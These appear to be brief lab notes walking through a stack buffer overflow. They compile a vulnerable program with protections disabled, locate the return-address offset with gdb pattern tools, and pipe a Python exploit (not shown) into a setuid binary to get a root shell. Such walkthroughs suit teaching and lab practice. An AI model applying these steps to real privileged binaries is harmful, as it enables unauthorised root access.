important to make this work need to compile source like
$ gcc -fno-stack-protector -z execstack ./overflow.c -o overflow

Objective:
Exploit function which expects user input

$ ./overflow usr_input

do not forget to dump core when segmentation fault hapends

$ ulimit -c unlimited

1. create fuzzing string

gdb> pattern_create 1000 fuzz.txt

2. cat fuzz.txt | ./overflow

3. gdb -q ./overflow ./core

4. gdb> pattern_offset 0x4e734138

pattern_offset 0x4e734138: 516

5. Buid the exploit.

6. Run exploit

Mqke sure you run binary which has sticky bit set,
not the copy of it.

before running exploit on priveledged binary
make  sure it works for its copy.
When it is working fine , make copy of priveledged binary
and adjut exploit (return address EIP )

$ python exploit.py | tee exploit_s.txt

$ (cat exploit_s.txt ; cat) | ../../overflow

If everything done correctly you should have root shell.
